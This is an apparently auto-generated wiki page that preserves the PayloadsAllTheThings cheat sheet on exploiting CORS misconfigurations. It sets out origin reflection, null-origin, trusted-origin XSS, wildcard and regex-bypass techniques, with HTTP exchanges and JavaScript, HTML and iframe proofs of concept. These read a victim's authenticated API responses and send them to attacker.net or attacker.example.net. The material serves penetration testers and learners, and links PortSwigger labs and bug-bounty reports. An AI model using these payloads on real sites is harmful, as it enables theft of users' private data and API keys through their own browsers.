---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# CORS Misconfiguration

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-cors-misconfiguration-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/CORS Misconfiguration/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [CORS Misconfiguration](../../topics/cors-misconfiguration/cors-misconfiguration.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-cors-misconfiguration-readme |
| name | CORS Misconfiguration |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration/README.md |

## Preserved Source Material

````yaml
_body: "# CORS Misconfiguration\n\n> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker\
  \ to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials:\
  \ true meaning we could make requests from our attacker's site using the victim's credentials.\n\n## Summary\n\n* [Tools](#tools)\n\
  * [Requirements](#requirements)\n* [Methodology](#methodology)\n    * [Origin Reflection](#origin-reflection)\n    * [Null\
  \ Origin](#null-origin)\n    * [XSS on Trusted Origin](#xss-on-trusted-origin)\n    * [Wildcard Origin without Credentials](#wildcard-origin-without-credentials)\n\
  \    * [Expanding the Origin](#expanding-the-origin)\n* [Labs](#labs)\n* [References](#references)\n\n## Tools\n\n* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/)\
  \ - CORS Misconfiguration Scanner\n* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration\
  \ vulnerabilities scanner\n* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder\n* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors)\
  \ - Exploit CORS misconfigurations on the internal networks\n* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)\
  \ - Fast CORS Misconfiguration Discovery Tool\n\n## Requirements\n\n* BURP HEADER> `Origin: https://evil.com`\n* VICTIM\
  \ HEADER> `Access-Control-Allow-Credential: true`\n* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin:\
  \ null`\n\n## Methodology\n\nUsually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration\
  \ on target `https://victim.example.com/endpoint`.\n\n### Origin Reflection\n\n#### Vulnerable Implementation\n\n```powershell\n\
  GET /endpoint HTTP/1.1\nHost: victim.example.com\nOrigin: https://evil.com\nCookie: sessionid=... \n\nHTTP/1.1 200 OK\n\
  Access-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}\n```\n\
  \n#### Proof Of Concept\n\nThis PoC requires that the respective JS script is hosted at `evil.com`\n\n```js\nvar req = new\
  \ XMLHttpRequest(); \nreq.onload = reqListener; \nreq.open('get','https://victim.example.com/endpoint',true); \nreq.withCredentials\
  \ = true;\nreq.send();\n\nfunction reqListener() {\n    location='//attacker.net/log?key='+this.responseText; \n};\n```\n\
  \nor\n\n```html\n<html>\n     <body>\n         <h2>CORS PoC</h2>\n         <div id=\"demo\">\n             <button type=\"\
  button\" onclick=\"cors()\">Exploit</button>\n         </div>\n         <script>\n             function cors() {\n     \
  \        var xhr = new XMLHttpRequest();\n             xhr.onreadystatechange = function() {\n                 if (this.readyState\
  \ == 4 && this.status == 200) {\n                 document.getElementById(\"demo\").innerHTML = alert(this.responseText);\n\
  \                 }\n             };\n              xhr.open(\"GET\",\n                       \"https://victim.example.com/endpoint\"\
  , true);\n             xhr.withCredentials = true;\n             xhr.send();\n             }\n         </script>\n     </body>\n\
  \ </html>\n```\n\n### Null Origin\n\n#### Vulnerable Implementation\n\nIt's possible that the server does not reflect the\
  \ complete `Origin` header but\nthat the `null` origin is allowed. This would look like this in the server's\nresponse:\n\
  \n```ps1\nGET /endpoint HTTP/1.1\nHost: victim.example.com\nOrigin: null\nCookie: sessionid=... \n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin:\
  \ null\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"}\n```\n\n#### Proof Of Concept\n\nThis can be\
  \ exploited by putting the attack code into an iframe using the data\nURI scheme. If the data URI scheme is used, the browser\
  \ will use the `null`\norigin in the request:\n\n```html\n<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\"\
  \ src=\"data:text/html, <script>\n  var req = new XMLHttpRequest();\n  req.onload = reqListener;\n  req.open('get','https://victim.example.com/endpoint',true);\n\
  \  req.withCredentials = true;\n  req.send();\n\n  function reqListener() {\n    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);\n\
  \   };\n</script>\"></iframe> \n```\n\n### XSS on Trusted Origin\n\nIf the application does implement a strict whitelist\
  \ of allowed origins, the\nexploit codes from above do not work. But if you have an XSS on a trusted\norigin, you can inject\
  \ the exploit coded from above in order to exploit CORS\nagain.\n\n```ps1\nhttps://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>\n\
  ```\n\n### Wildcard Origin without Credentials\n\nIf the server responds with a wildcard origin `*`, **the browser does\
  \ never send\nthe cookies**. However, if the server does not require authentication, it's still\npossible to access the\
  \ data on the server. This can happen on internal servers\nthat are not accessible from the Internet. The attacker's website\
  \ can then\npivot into the internal network and access the server's data without authentication.\n\n```powershell\n* is\
  \ the only wildcard origin\nhttps://*.example.com is not valid\n```\n\n#### Vulnerable Implementation\n\n```powershell\n\
  GET /endpoint HTTP/1.1\nHost: api.internal.example.com\nOrigin: https://evil.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin:\
  \ *\n\n{\"[private API key]\"}\n```\n\n#### Proof Of Concept\n\n```js\nvar req = new XMLHttpRequest(); \nreq.onload = reqListener;\
  \ \nreq.open('get','https://api.internal.example.com/endpoint',true); \nreq.send();\n\nfunction reqListener() {\n    location='//attacker.net/log?key='+this.responseText;\
  \ \n};\n```\n\n### Expanding the Origin\n\nOccasionally, certain expansions of the original origin are not filtered on the\
  \ server side. This might be caused by using a badly implemented regular expressions to validate the origin header.\n\n\
  #### Vulnerable Implementation (Example 1)\n\nIn this scenario any prefix inserted in front of `example.com` will be accepted\
  \ by the server.\n\n```ps1\nGET /endpoint HTTP/1.1\nHost: api.example.com\nOrigin: https://evilexample.com\n\nHTTP/1.1 200\
  \ OK\nAccess-Control-Allow-Origin: https://evilexample.com\nAccess-Control-Allow-Credentials: true \n\n{\"[private API key]\"\
  }\n```\n\n#### Proof of Concept (Example 1)\n\nThis PoC requires the respective JS script to be hosted at `evilexample.com`\n\
  \n```js\nvar req = new XMLHttpRequest(); \nreq.onload = reqListener; \nreq.open('get','https://api.example.com/endpoint',true);\
  \ \nreq.withCredentials = true;\nreq.send();\n\nfunction reqListener() {\n    location='//attacker.net/log?key='+this.responseText;\
  \ \n};\n```\n\n#### Vulnerable Implementation (Example 2)\n\nIn this scenario the server utilizes a regex where the dot\
  \ was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\\.example.com$`. Thus,\
  \ the dot can be replaced with any letter to gain access from a third-party domain.\n\n```ps1\nGET /endpoint HTTP/1.1\n\
  Host: api.example.com\nOrigin: https://apiiexample.com\n\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://apiiexample.com\n\
  Access-Control-Allow-Credentials: true \n\n{\"[private API key]\"}\n```\n\n#### Proof of concept (Example 2)\n\nThis PoC\
  \ requires the respective JS script to be hosted at `apiiexample.com`\n\n```js\nvar req = new XMLHttpRequest(); \nreq.onload\
  \ = reqListener; \nreq.open('get','https://api.example.com/endpoint',true); \nreq.withCredentials = true;\nreq.send();\n\
  \nfunction reqListener() {\n    location='//attacker.net/log?key='+this.responseText; \n};\n```\n\n## Labs\n\n* [PortSwigger\
  \ - CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)\n\
  * [PortSwigger - CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)\n\
  * [PortSwigger - CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)\n\
  * [PortSwigger - CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)\n\
  \n## References\n\n* [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) - December 20, 2018](https://hackerone.com/reports/470298)\n\
  * [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)\n\
  * [CORS misconfig | Account Takeover - Rohan (nahoragg) - October 20, 2018](https://web.archive.org/web/20250426222841/https://hackerone.com/reports/426147)\n\
  * [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) - October 29, 2018](https://web.archive.org/web/20190820201328/https://hackerone.com/reports/430249)\n\
  * [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) - September 15, 2016](https://web.archive.org/web/20171230084544/https://hackerone.com/reports/168574)\n\
  * [CORS Misconfigurations Explained - Detectify Blog - April 26, 2018](https://web.archive.org/web/20230323053559/https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)\n\
  * [Cross-origin resource sharing (CORS) - PortSwigger Web Security Academy - December 30, 2019](https://web.archive.org/web/20260302141111/https://portswigger.net/web-security/cors)\n\
  * [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) - June 1, 2017](https://web.archive.org/web/20250512191501/https://hackerone.com/reports/235200)\n\
  * [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle - October 14, 2016](https://web.archive.org/web/20190919034024/https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)\n\
  * [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - December 16, 2016](https://web.archive.org/web/20260204152901/https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)\n\
  * [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14, 2019](https://web.archive.org/web/20210126182728/https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)"
_relative_path: CORS Misconfiguration/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/CORS Misconfiguration/README.md
````
